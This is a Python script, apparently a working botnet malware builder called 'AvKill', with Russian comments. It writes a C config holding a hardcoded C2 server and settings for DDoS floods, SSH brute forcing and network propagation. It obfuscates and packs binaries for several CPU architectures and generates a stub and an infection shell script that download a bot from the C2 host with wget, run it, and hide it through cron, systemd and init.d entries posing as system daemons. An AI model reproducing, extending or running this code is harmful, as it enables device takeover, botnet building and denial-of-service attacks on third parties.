#!/usr/bin/env python3
"""
AvKill Bot Builder
Author: @kwavka
Project: https://t.me/+x7wZtZ23I5pkMjQy
"""

import os
import sys
import json
import base64
import random
import string
import subprocess
from pathlib import Path
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
import argparse

class BotBuilder:
    def __init__(self):
        self.config = self.load_config()
        self.architectures = {
            'x86': {
                'cc': 'gcc',
                'flags': '-m32 -static -s -O2',
                'output': 'bot_x86',
                'stub': 'stub_x86.bin'
            },
            'x64': {
                'cc': 'gcc',
                'flags': '-m64 -static -s -O2',
                'output': 'bot_x64',
                'stub': 'stub_x64.bin'
            },
            'arm': {
                'cc': 'arm-linux-gnueabi-gcc',
                'flags': '-static -s -O2',
                'output': 'bot_arm',
                'stub': 'stub_arm.bin'
            },
            'arm7': {
                'cc': 'arm-linux-gnueabihf-gcc',
                'flags': '-static -s -O2',
                'output': 'bot_arm7',
                'stub': 'stub_arm7.bin'
            },
            'mips': {
                'cc': 'mips-linux-gnu-gcc',
                'flags': '-static -s -O2',
                'output': 'bot_mips',
                'stub': 'stub_mips.bin'
            },
            'mipsel': {
                'cc': 'mipsel-linux-gnu-gcc',
                'flags': '-static -s -O2',
                'output': 'bot_mipsel',
                'stub': 'stub_mipsel.bin'
            }
        }
        
    def load_config(self):
        config_path = Path('builder/config.json')
        if config_path.exists():
            with open(config_path, 'r') as f:
                return json.load(f)
        return {
            'c2_server': '185.216.71.123',
            'c2_port': 1337,
            'c2_ssl': False,
            'encryption_key': Fernet.generate_key().decode(),
            'auto_update': True,
            'persistence': True,
            'propagation': True
        }
    
    def save_config(self):
        config_path = Path('builder/config.json')
        config_path.parent.mkdir(exist_ok=True)
        with open(config_path, 'w') as f:
            json.dump(self.config, f, indent=2)
    
    def generate_config_c(self, custom_config=None):
        """Генерация config.h с настройками бота"""
        config = custom_config or self.config
        
        config_h = f"""
#ifndef CONFIG_H
#define CONFIG_H

// C2 Server Configuration
#define C2_SERVER "{config['c2_server']}"
#define C2_PORT {config['c2_port']}
#define C2_SSL {"1" if config.get('c2_ssl') else "0"}

// Bot Settings
#define BOT_ID "{self.generate_bot_id()}"
#define BOT_VERSION "3.0"
#define AUTO_UPDATE {"1" if config.get('auto_update') else "0"}
#define ENABLE_PROPAGATION {"1" if config.get('propagation') else "0"}

// Encryption
#define ENCRYPTION_KEY "{config['encryption_key']}"

// Network Settings
#define SCAN_SUBNET "192.168.1.0/24"
#define MAX_SCAN_THREADS 50
#define SSH_BRUTE_THREADS 10

// Persistence Methods
#define PERSISTENCE_CRON {"1" if config.get('persistence') else "0"}
#define PERSISTENCE_SYSTEMD {"1" if config.get('persistence') else "0"}
#define PERSISTENCE_INIT {"1" if config.get('persistence') else "0"}

// DDoS Settings
#define MAX_DDOS_THREADS 500
#define HTTP_FLOOD_DELAY 10
#define SYN_FLOOD_PPS 1000
#define UDP_PACKET_SIZE 65000

// Logging
#define LOG_LEVEL 2  // 0: None, 1: Errors, 2: Info, 3: Debug
#define LOG_FILE "/tmp/.system.log"

// Security
#define ANTI_DEBUG 1
#define CODE_OBFUSCATION 1
#define STRING_ENCRYPTION 1

#endif
"""
        
        config_path = Path('../bot/config.h')
        config_path.write_text(config_h)
        print(f"[+] Generated config.h for {config['c2_server']}:{config['c2_port']}")
    
    def generate_bot_id(self):
        """Генерация уникального ID бота"""
        prefix = 'AVK'
        random_part = ''.join(random.choices(string.hexdigits.upper(), k=8))
        return f"{prefix}-{random_part}"
    
    def encrypt_strings(self, source_code):
        """Шифрование строк в исходном коде"""
        # Простой XOR шифровальщик строк
        key = random.randint(1, 255)
        encrypted_code = source_code
        
        # Находим и шифруем строки
        import re
        strings = re.findall(r'"([^"\\]*(?:\\.[^"\\]*)*)"', source_code)
        
        for s in strings:
            if len(s) > 3 and not s.startswith('/'):  # Не шифруем пути и короткие строки
                encrypted = ''.join(chr(ord(c) ^ key) for c in s)
                encoded = base64.b64encode(encrypted.encode()).decode()
                replace_str = f'decrypt_string("{encoded}", {key})'
                encrypted_code = encrypted_code.replace(f'"{s}"', replace_str)
        
        return encrypted_code
    
    def add_obfuscation(self, source_code):
        """Добавление обфускации кода"""
        obfuscated = source_code
        
        # Добавляем мусорный код
        garbage_code = """
        // Obfuscation layer
        #define DECOY_FUNC1(a,b) ((a)^(b))
        #define DECOY_FUNC2(a,b) ((a)+(b))
        #define DECOY_FUNC3(a,b) ((a)*(b))
        
        static inline void anti_debug_check() {
            #ifdef ANTI_DEBUG
            volatile int *ptr = (volatile int*)0;
            *ptr = 0xDEADBEEF;
            #endif
        }
        """
        
        # Вставляем после всех инклюдов
        if '#include' in obfuscated:
            parts = obfuscated.split('#include', 1)
            obfuscated = parts[0] + garbage_code + '#include' + parts[1]
        
        return obfuscated
    
    def build_bot(self, arch, output_dir='../bot/build'):
        """Сборка бота для указанной архитектуры"""
        if arch not in self.architectures:
            print(f"[-] Unknown architecture: {arch}")
            return False
        
        arch_info = self.architectures[arch]
        source_dir = Path('../bot')
        output_path = Path(output_dir) / arch_info['output']
        
        # Проверяем компилятор
        try:
            subprocess.run([arch_info['cc'], '--version'], 
                         capture_output=True, check=True)
        except (subprocess.CalledProcessError, FileNotFoundError):
            print(f"[-] Compiler not found: {arch_info['cc']}")
            return False
        
        # Список исходных файлов
        source_files = [
            source_dir / 'bot.c',
            source_dir / 'scanner.c',
            source_dir / 'infection.c',
            source_dir / 'ddos.c',
            source_dir / 'persistence.c',
            source_dir / 'encryption.c'
        ]
        
        # Проверяем наличие файлов
        missing_files = [f for f in source_files if not f.exists()]
        if missing_files:
            print(f"[-] Missing source files: {missing_files}")
            return False
        
        # Команда компиляции
        cmd = [
            arch_info['cc'],
            *arch_info['flags'].split(),
            '-I', str(source_dir),
            '-pthread',
            '-o', str(output_path)
        ]
        
        # Добавляем исходные файлы
        cmd.extend(str(f) for f in source_files)
        
        print(f"[+] Building {arch} bot...")
        print(f"    Command: {' '.join(cmd)}")
        
        try:
            # Компиляция
            result = subprocess.run(cmd, capture_output=True, text=True)
            
            if result.returncode != 0:
                print(f"[-] Compilation failed:")
                print(result.stderr)
                return False
            
            # Strip binary
            subprocess.run(['strip', str(output_path)], check=True)
            
            # UPX сжатие
            upx_path = Path('/usr/bin/upx')
            if upx_path.exists():
                subprocess.run(['upx', '--ultra-brute', str(output_path)], 
                             capture_output=True)
            
            # Проверяем размер
            size = output_path.stat().st_size
            print(f"[+] Build successful: {output_path} ({size:,} bytes)")
            
            return True
            
        except Exception as e:
            print(f"[-] Build error: {e}")
            return False
    
    def build_all(self):
        """Сборка ботов для всех архитектур"""
        print("[+] Building bots for all architectures...")
        
        success_count = 0
        for arch in self.architectures:
            if self.build_bot(arch):
                success_count += 1
        
        print(f"[+] Built {success_count}/{len(self.architectures)} architectures")
        return success_count > 0
    
    def generate_stub(self, arch):
        """Генерация stub-файла для заражения"""
        stub_code = f"""
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/stat.h>

#define PAYLOAD_URL "http://{self.config['c2_server']}/bots/bot_{arch}"
#define INSTALL_PATH "/tmp/.systemd"

void download_payload() {{
    char cmd[512];
    snprintf(cmd, sizeof(cmd),
        "wget -q %s -O %s && "
        "chmod +x %s && "
        "%s &",
        PAYLOAD_URL, INSTALL_PATH, INSTALL_PATH, INSTALL_PATH);
    system(cmd);
}}

void setup_persistence() {{
    // Add to crontab
    system("echo '@reboot %s' | crontab -");
    
    // Add to rc.local if exists
    system("echo '%s &' >> /etc/rc.local 2>/dev/null");
    
    // Systemd service
    char systemd_service[] = 
        "[Unit]\\n"
        "Description=System Daemon\\n"
        "After=network.target\\n"
        "\\n"
        "[Service]\\n"
        "Type=simple\\n"
        "ExecStart=%s\\n"
        "Restart=always\\n"
        "\\n"
        "[Install]\\n"
        "WantedBy=multi-user.target";
    
    FILE *f = fopen("/etc/systemd/system/systemd-daemon.service", "w");
    if(f) {{
        fprintf(f, systemd_service, INSTALL_PATH);
        fclose(f);
        system("systemctl enable systemd-daemon.service");
    }}
}}

int main() {{
    // Hide process
    daemon(1, 0);
    
    // Download main payload
    download_payload();
    
    // Setup persistence
    setup_persistence();
    
    // Cleanup
    unlink("/tmp/stub");
    
    return 0;
}}
"""
        
        stub_path = Path(f'builder/stubs/stub_{arch}.c')
        stub_path.parent.mkdir(exist_ok=True)
        stub_path.write_text(stub_code)
        
        # Компилируем stub
        arch_info = self.architectures.get(arch, self.architectures['x86'])
        cmd = [
            arch_info['cc'],
            '-static', '-s', '-O2',
            '-o', f'builder/stubs/stub_{arch}.bin',
            str(stub_path)
        ]
        
        try:
            subprocess.run(cmd, check=True, capture_output=True)
            print(f"[+] Generated stub for {arch}")
        except Exception as e:
            print(f"[-] Failed to build stub for {arch}: {e}")
    
    def create_infect_package(self, target_archs=None):
        """Создание пакета для заражения"""
        target_archs = target_archs or ['x86', 'x64', 'arm', 'arm7', 'mips']
        
        package_dir = Path('builder/packages')
        package_dir.mkdir(exist_ok=True)
        
        # Создаем скрипт заражения
        infect_script = """#!/bin/bash
# AvKill Infection Script
# Author: @kwavka

C2_SERVER="{c2_server}"
LOG_FILE="/tmp/.infect.log"

log() {
    echo "[$(date '+%Y-%m-%d %H:%M:%S')] $1" >> $LOG_FILE
}

detect_architecture() {
    if [ -x "$(command -v uname)" ]; then
        ARCH=$(uname -m)
        case $ARCH in
            x86_64) echo "x64" ;;
            i386|i686) echo "x86" ;;
            armv7l) echo "arm7" ;;
            arm*) echo "arm" ;;
            mips*) echo "mips" ;;
            *) echo "unknown" ;;
        esac
    else
        echo "unknown"
    fi
}

download_bot() {
    ARCH=$1
    URL="http://$C2_SERVER/bots/bot_$ARCH"
    
    log "Downloading bot for $ARCH..."
    wget -q $URL -O /tmp/.systemd
    chmod +x /tmp/.systemd
    
    if [ -f /tmp/.systemd ]; then
        log "Bot downloaded successfully"
        return 0
    else
        log "Download failed"
        return 1
    fi
}

setup_persistence() {
    # Crontab
    echo "@reboot /tmp/.systemd" | crontab - 2>/dev/null
    
    # Systemd
    if [ -d /etc/systemd/system ]; then
        cat > /etc/systemd/system/systemd-daemon.service << EOF
[Unit]
Description=System Daemon
After=network.target

[Service]
Type=simple
ExecStart=/tmp/.systemd
Restart=always

[Install]
WantedBy=multi-user.target
EOF
        systemctl enable systemd-daemon.service 2>/dev/null
    fi
    
    # Init.d
    if [ -d /etc/init.d ]; then
        cp /tmp/.systemd /etc/init.d/systemd-daemon
        update-rc.d systemd-daemon defaults 2>/dev/null
    fi
    
    log "Persistence setup complete"
}

start_bot() {
    /tmp/.systemd &
    log "Bot started with PID $!"
}

main() {
    log "=== AvKill Infection Started ==="
    
    # Detect architecture
    ARCH=$(detect_architecture)
    log "Detected architecture: $ARCH"
    
    if [ "$ARCH" = "unknown" ]; then
        log "Unknown architecture, trying x86"
        ARCH="x86"
    fi
    
    # Download bot
    if download_bot $ARCH; then
        setup_persistence
        start_bot
        log "Infection successful"
    else
        log "Infection failed"
    fi
    
    # Cleanup
    rm -f "$0"
    log "=== Infection Script Removed ==="
}

main "$@"
""".format(c2_server=self.config['c2_server'])
        
        script_path = package_dir / 'infect.sh'
        script_path.write_text(infect_script)
        script_path.chmod(0o755)
        
        # Копируем стабы
        for arch in target_archs:
            stub_src = Path(f'builder/stubs/stub_{arch}.bin')
            if stub_src.exists():
                import shutil
                shutil.copy(stub_src, package_dir / f'stub_{arch}.bin')
        
        # Создаем архив
        import tarfile
        archive_path = package_dir / 'avkill_infect.tar.gz'
        with tarfile.open(archive_path, 'w:gz') as tar:
            tar.add(script_path, arcname='infect.sh')
            for arch in target_archs:
                stub_file = package_dir / f'stub_{arch}.bin'
                if stub_file.exists():
                    tar.add(stub_file, arcname=f'stubs/stub_{arch}.bin')
        
        print(f"[+] Infection package created: {archive_path}")
        return archive_path
    
    def interactive_builder(self):
        """Интерактивный режим сборки"""
        print("=" * 50)
        print("🛡️  AvKill Bot Builder")
        print("=" * 50)
        
        while True:
            print("\n[1] Configure C2 Server")
            print("[2] Build Single Architecture")
            print("[3] Build All Architectures")
            print("[4] Generate Infection Package")
            print("[5] Generate Stubs")
            print("[6] Show Configuration")
            print("[7] Save Configuration")
            print("[0] Exit")
            
            choice = input("\nSelect option: ").strip()
            
            if choice == "1":
                self.configure_c2()
            elif choice == "2":
                self.build_single()
            elif choice == "3":
                self.build_all()
            elif choice == "4":
                self.create_infect_package()
            elif choice == "5":
                self.generate_all_stubs()
            elif choice == "6":
                self.show_config()
            elif choice == "7":
                self.save_config()
                print("[+] Configuration saved")
            elif choice == "0":
                break
            else:
                print("[-] Invalid option")
    
    def configure_c2(self):
        """Конфигурация C2 сервера"""
        print("\n--- C2 Server Configuration ---")
        self.config['c2_server'] = input(f"C2 Server [{self.config['c2_server']}]: ") or self.config['c2_server']
        self.config['c2_port'] = int(input(f"C2 Port [{self.config['c2_port']}]: ") or self.config['c2_port'])
        self.config['c2_ssl'] = input("Use SSL? (y/n) [n]: ").lower() == 'y'
        
        # Генерация нового ключа шифрования
        if input("Generate new encryption key? (y/n) [n]: ").lower() == 'y':
            self.config['encryption_key'] = Fernet.generate_key().decode()
            print(f"[+] New key: {self.config['encryption_key']}")
        
        self.generate_config_c()
    
    def build_single(self):
        """Сборка для одной архитектуры"""
        print("\nAvailable architectures:")
        for i, arch in enumerate(self.architectures.keys(), 1):
            print(f"  [{i}] {arch}")
        
        try:
            choice = int(input("\nSelect architecture: ")) - 1
            arch = list(self.architectures.keys())[choice]
            self.build_bot(arch)
        except (ValueError, IndexError):
            print("[-] Invalid selection")
    
    def generate_all_stubs(self):
        """Генерация всех стабов"""
        for arch in self.architectures:
            self.generate_stub(arch)
    
    def show_config(self):
        """Показать текущую конфигурацию"""
        print("\n--- Current Configuration ---")
        for key, value in self.config.items():
            print(f"  {key}: {value}")
        print("-" * 30)

def main():
    parser = argparse.ArgumentParser(description='AvKill Bot Builder')
    parser.add_argument('--config', action='store_true', help='Configure C2 server')
    parser.add_argument('--build', choices=['all', 'x86', 'x64', 'arm', 'arm7', 'mips', 'mipsel'],
                       help='Build bot for architecture')
    parser.add_argument('--package', action='store_true', help='Create infection package')
    parser.add_argument('--stubs', action='store_true', help='Generate stubs')
    parser.add_argument('--interactive', '-i', action='store_true', help='Interactive mode')
    
    args = parser.parse_args()
    builder = BotBuilder()
    
    if args.config:
        builder.configure_c2()
    elif args.build:
        if args.build == 'all':
            builder.build_all()
        else:
            builder.build_bot(args.build)
    elif args.package:
        builder.create_infect_package()
    elif args.stubs:
        builder.generate_all_stubs()
    elif args.interactive:
        builder.interactive_builder()
    else:
        parser.print_help()

if __name__ == '__main__':
    # Проверка зависимостей
    required = ['gcc', 'strip', 'upx']
    missing = []
    
    for cmd in required:
        try:
            subprocess.run([cmd, '--version'], capture_output=True, check=True)
        except (subprocess.CalledProcessError, FileNotFoundError):
            missing.append(cmd)
    
    if missing:
        print(f"[-] Missing dependencies: {', '.join(missing)}")
        print("[+] Install with: apt-get install gcc binutils upx-ucl")
        sys.exit(1)
    
    main()